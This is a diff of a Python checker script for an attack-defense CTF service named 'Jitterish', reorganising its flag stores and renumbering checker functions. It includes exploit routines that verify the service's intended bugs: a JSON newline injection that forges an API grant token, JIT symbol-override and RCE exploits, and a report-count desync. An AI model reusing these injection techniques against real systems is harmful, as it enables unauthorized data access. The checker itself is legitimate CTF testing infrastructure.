@@ -36,6 +36,7 @@ app = lambda: checker.app
 0 = community, private collections, pwn the jit
 1 = business, flag in profile, pwn the communication protocol with the support feature
 2 = enterprise, private DB with public API, pwn the storage format
+(exploits are off-by-one because flagstore 0 has two (0+1))
 """
 
 
@@ -69,76 +70,18 @@ def dump_strings(a: Any) -> str:
     return str(a)
 
 
-@checker.putflag(1)
-@handle_invalid_response_exceptions
-async def putflag_enterprise(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
-                             db: ChainDB) -> str:
-    """
-    "Enterprise" account with API access and a few tokens.
-    """
-    client = JitterishClient(logger, httpclient)
+# =================================================================================================
+# SITUATION 0: COMMUNITY / PUBLIC DATABASE
+# =================================================================================================
 
-    username = generate_username()
-    password = generate_password()
-    await client.register(username, password,
-                          generate_random_string(8, False), generate_random_string(8, False),
-                          'enterprise')
-
-    for _ in range(random.randint(0, 2)):
-        await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
-    key = await client.api_create(username, {'flag': task.flag, 'ident': task.task_id})
-    logger.info(f'key = {key}')
-    for _ in range(random.randint(0, 1)):
-        await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
-    token = generate_token()
-    logger.info(f'token = {key}')
-    grant_result = await client.api_grant(username, key, token)
-    if not grant_result:
-        raise MumbleException('Could not grant token auth')
-    for _ in range(random.randint(0, 2)):
-        await client.api_grant(username, key, generate_token())
-
-    await db.set("info", (username, password, key, token))
-    return username
+@checker.havoc(0)
+async def havoc_check_static_pages(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB,
+                                   di: DependencyInjector) -> None:
+    await client.get('/')
+    await client.get('/docs')
 
 
-@checker.getflag(1)
-@handle_invalid_response_exceptions
-async def getflag_enterprise(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
-                             db: ChainDB) -> None:
-    try:
-        username, password, key, token = await db.get("info")
-    except KeyError:
-        raise MumbleException("Database info missing")
-
-    client = JitterishClient(logger, httpclient)
-    customers = (await client.list_customers())['enterprise']
-    assert_in(username, customers, f"Customer {username} missing in customer list")
-
-    # key is public?
-    keys = await client.api_get(username, 'keys')
-    if not isinstance(keys, list): raise MumbleException("Ill-typed api response (keys)")
-    assert_in(key, keys, "Key missing")
-
-    # can append to this collection?
-    await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
-    # we might actually test if it's retrievable, but not for now
-
-    # token auth
-    payload = await client.api_get(username, 'value', key, token)
-    if not isinstance(payload, list) or len(payload) < 1: raise MumbleException("Empty/ill-typed api response")
-    assert_in('flag', payload[0], "Flag missing")
-    assert_equals(payload[0]['flag'], task.flag, "Flag missing")
-
-    # user auth
-    await client.login(username, password)
-    payload = await client.api_get(username, 'value', key)
-    if not isinstance(payload, list) or len(payload) < 1: raise MumbleException("Empty/ill-typed api response")
-    assert_in('flag', payload[0], "Flag missing")
-    assert_equals(payload[0]['flag'], task.flag, "Flag missing")
-
-
-@checker.putflag(2)
+@checker.putflag(0)
 @handle_invalid_response_exceptions
 async def putflag_community(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                             db: ChainDB) -> str:
@@ -171,7 +114,7 @@ async def putflag_community(task: PutflagCheckerTaskMessage, logger: LoggerAdapt
     return username
 
 
-@checker.getflag(2)
+@checker.getflag(0)
 @handle_invalid_response_exceptions
 async def getflag_community(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                             db: ChainDB) -> None:
@@ -219,7 +162,7 @@ async def getflag_community(task: GetflagCheckerTaskMessage, logger: LoggerAdapt
         assert_equals(output, function.output, "Wrong function output")
 
 
-@checker.putnoise(2)
+@checker.putnoise(0)
 async def putnoise_community(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                              db: ChainDB) -> None:
     """
@@ -245,7 +188,7 @@ async def putnoise_community(task: PutnoiseCheckerTaskMessage, logger: LoggerAda
     await db.set("noise_collection", (username, collection.to_json(), public_value))
 
 
-@checker.getnoise(2)
+@checker.getnoise(0)
 async def getnoise_community(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB,
                              di: DependencyInjector) -> None:
     try:
@@ -294,56 +237,13 @@ async def getnoise_community(task: GetnoiseCheckerTaskMessage, logger: LoggerAda
             assert_equals(output, f.output, "Query result is wrong (undefined)")
 
 
-@checker.havoc(1)
-async def havoc_check_static_pages(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB,
-                                   di: DependencyInjector) -> None:
-    await client.get('/')
-    await client.get('/docs')
-
-
-@checker.exploit(1)
-async def exploit_kv_newline_injection(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
-                                       httpclient: AsyncClient) -> bytes | None:
-    if not task.attack_info:
-        raise InternalErrorException("Missing attack info")
-    username = task.attack_info
-    client = JitterishClient(logger, httpclient)
-    my_token = generate_token()
-
-    # get keys
-    try:
-        keys = (await client.api_get(username))[:10]
-    except MumbleException as e:
-        logger.warning(f'Account {username} does not exist or has no API', exc_info=e)
-        return None
-
-    # hack each key individually
-    logger.info(f'Attacking database {username} ({len(keys)} keys)')
-    all_output = ''
-    for key in keys:
-        logger.info(f'write fake token {my_token} for key {key}...')
-        # these newlines inject a faked "grant" structure into the database
-        data = '{"fake_token":\n' + json.dumps({'key': key, 'token': my_token}) + '\n}'
-        await client.post(f'/api/{username}/create', data=data, headers={'Content-Type': 'application/json'})
-        response = await client.api_get(username, 'value', key, my_token)
-        logger.info(f'Key {key} with fake token {my_token} => {response}')
-        all_output += dump_strings(response) + ' '
-    return searcher.search_flag(all_output)
-
-
-@checker.exploit(2)
-async def exploit_jit(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
-                      httpclient: AsyncClient) -> bytes | None:
-    if not task.attack_info:
-        raise InternalErrorException("Missing attack info")
-    f1 = await exploit_jit_symbol_override(task.attack_info, logger, searcher, httpclient)
-    httpclient.cookies.clear()
-    f2 = await exploit_jit_rce(task.attack_info, logger, searcher, httpclient)
-    return f1 if f1 == f2 else None  # tests should succeed iff both exploits worked
-
-
-async def exploit_jit_symbol_override(database: str, logger: LoggerAdapter, searcher: FlagSearcher,
+@checker.exploit(0)
+async def exploit_jit_symbol_override(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
                                       httpclient: AsyncClient) -> bytes | None:
+    if not task.attack_info:
+        raise InternalErrorException("Missing attack info")
+    database = task.attack_info
+
     # any account will do it
     client = JitterishClient(logger, httpclient)
     await client.register(generate_username(), generate_password(),
@@ -368,9 +268,14 @@ async def exploit_jit_symbol_override(database: str, logger: LoggerAdapter, sear
     return searcher.search_flag(all_output)
 
 
-async def exploit_jit_rce(database: str, logger: LoggerAdapter, searcher: FlagSearcher,
+@checker.exploit(1)
+async def exploit_jit_rce(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
                           httpclient: AsyncClient) -> bytes | None:
     """this exploit does NOT work with a debug build of libjit_rt. Use the release/minsizerel builds."""
+    if not task.attack_info:
+        raise InternalErrorException("Missing attack info")
+    database = task.attack_info
+
     # any account will do it
     client = JitterishClient(logger, httpclient)
     await client.register(generate_username(), generate_password(),
@@ -397,7 +302,11 @@ async def exploit_jit_rce(database: str, logger: LoggerAdapter, searcher: FlagSe
     return searcher.search_flag(all_output)
 
 
-@checker.putflag(0)
+# =================================================================================================
+# SITUATION 1: BUSINESS / PROFILE / SUPPORT
+# =================================================================================================
+
+@checker.putflag(1)
 @handle_invalid_response_exceptions
 async def putflag_profile(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                           db: ChainDB) -> str:
@@ -429,7 +338,7 @@ async def putflag_profile(task: PutflagCheckerTaskMessage, logger: LoggerAdapter
     return username
 
 
-@checker.getflag(0)
+@checker.getflag(1)
 @handle_invalid_response_exceptions
 async def getflag_profile(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                           db: ChainDB) -> None:
@@ -473,7 +382,7 @@ async def register_random_account(client, db, req_num_reports=False, req_lfj=Fal
     return username, password, num_reports, looking_for_job, current_salary, custom
 
 
-@checker.putnoise(0)
+@checker.putnoise(1)
 @handle_invalid_response_exceptions
 async def putnoise_profile(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                            db: ChainDB) -> None:
@@ -485,7 +394,7 @@ async def putnoise_profile(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapt
     await db.set("profile_noise_account", (username, password, num_reports, looking_for_job, current_salary, custom))
 
 
-@checker.getnoise(0)
+@checker.getnoise(1)
 @handle_invalid_response_exceptions
 async def getnoise_profile(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB,
                            di: DependencyInjector) -> None:
@@ -512,7 +421,7 @@ async def getnoise_profile(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapt
     await client.logout()
 
 
-@checker.havoc(0)
+@checker.havoc(1)
 @handle_invalid_response_exceptions
 async def havoc_check_user_accounts(task: HavocCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB,
                                     di: DependencyInjector) -> None:
@@ -535,7 +444,7 @@ async def havoc_check_user_accounts(task: HavocCheckerTaskMessage, logger: Logge
         l = random.randint(4, 16)
         reason = generate_random_string(l, False)
         await client.report(v, reason)
-    # after report, the profile num reports entry should match the number of reports we issued 
+    # after report, the profile num reports entry should match the number of reports we issued
     response = await client.get('/session/profile')
     # the actual number of reports set during profile creation does not matter, the db counts the real reports
     assert_in(f'<strong>{actual_num_reports}</strong>', response.text,
@@ -564,7 +473,7 @@ async def signup_useless(client):
     return username
 
 
-@checker.exploit(0)
+@checker.exploit(2)
 async def exploit_desync(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
                          httpclient: AsyncClient) -> bytes | None:
     target_user = task.attack_info
@@ -583,11 +492,115 @@ async def exploit_desync(task: ExploitCheckerTaskMessage, logger: LoggerAdapter,
     await client.report(useless, reason)
     # report broken user
     await client.report(broken, reason)
-    # report gameserver 
+    # report gameserver
     logger.info(f'Exploiting target_user')
     await client.report(target_user, reason)
     res = await client.get('/session/profile')
     return searcher.search_flag(res.text)
+
+
+# =================================================================================================
+# SITUATION 2: ENTERPRISE / PRIVATE DATABASE WITH API
+# =================================================================================================
+
+
+@checker.putflag(2)
+@handle_invalid_response_exceptions
+async def putflag_enterprise(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
+                             db: ChainDB) -> str:
+    """
+    "Enterprise" account with API access and a few tokens.
+    """
+    client = JitterishClient(logger, httpclient)
+
+    username = generate_username()
+    password = generate_password()
+    await client.register(username, password,
+                          generate_random_string(8, False), generate_random_string(8, False),
+                          'enterprise')
+
+    for _ in range(random.randint(0, 2)):
+        await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
+    key = await client.api_create(username, {'flag': task.flag, 'ident': task.task_id})
+    logger.info(f'key = {key}')
+    for _ in range(random.randint(0, 1)):
+        await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
+    token = generate_token()
+    logger.info(f'token = {key}')
+    grant_result = await client.api_grant(username, key, token)
+    if not grant_result:
+        raise MumbleException('Could not grant token auth')
+    for _ in range(random.randint(0, 2)):
+        await client.api_grant(username, key, generate_token())
+
+    await db.set("info", (username, password, key, token))
+    return username
+
+
+@checker.getflag(2)
+@handle_invalid_response_exceptions
+async def getflag_enterprise(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
+                             db: ChainDB) -> None:
+    try:
+        username, password, key, token = await db.get("info")
+    except KeyError:
+        raise MumbleException("Database info missing")
+
+    client = JitterishClient(logger, httpclient)
+    customers = (await client.list_customers())['enterprise']
+    assert_in(username, customers, f"Customer {username} missing in customer list")
+
+    # key is public?
+    keys = await client.api_get(username, 'keys')
+    if not isinstance(keys, list): raise MumbleException("Ill-typed api response (keys)")
+    assert_in(key, keys, "Key missing")
+
+    # can append to this collection?
+    await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
+    # we might actually test if it's retrievable, but not for now
+
+    # token auth
+    payload = await client.api_get(username, 'value', key, token)
+    if not isinstance(payload, list) or len(payload) < 1: raise MumbleException("Empty/ill-typed api response")
+    assert_in('flag', payload[0], "Flag missing")
+    assert_equals(payload[0]['flag'], task.flag, "Flag missing")
+
+    # user auth
+    await client.login(username, password)
+    payload = await client.api_get(username, 'value', key)
+    if not isinstance(payload, list) or len(payload) < 1: raise MumbleException("Empty/ill-typed api response")
+    assert_in('flag', payload[0], "Flag missing")
+    assert_equals(payload[0]['flag'], task.flag, "Flag missing")
+
+
+@checker.exploit(3)
+async def exploit_kv_newline_injection(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
+                                       httpclient: AsyncClient) -> bytes | None:
+    if not task.attack_info:
+        raise InternalErrorException("Missing attack info")
+    username = task.attack_info
+    client = JitterishClient(logger, httpclient)
+    my_token = generate_token()
+
+    # get keys
+    try:
+        keys = (await client.api_get(username))[:10]
+    except MumbleException as e:
+        logger.warning(f'Account {username} does not exist or has no API', exc_info=e)
+        return None
+
+    # hack each key individually
+    logger.info(f'Attacking database {username} ({len(keys)} keys)')
+    all_output = ''
+    for key in keys:
+        logger.info(f'write fake token {my_token} for key {key}...')
+        # these newlines inject a faked "grant" structure into the database
+        data = '{"fake_token":\n' + json.dumps({'key': key, 'token': my_token}) + '\n}'
+        await client.post(f'/api/{username}/create', data=data, headers={'Content-Type': 'application/json'})
+        response = await client.api_get(username, 'value', key, my_token)
+        logger.info(f'Key {key} with fake token {my_token} => {response}')
+        all_output += dump_strings(response) + ' '
+    return searcher.search_flag(all_output)
 
 
 if __name__ == "__main__":
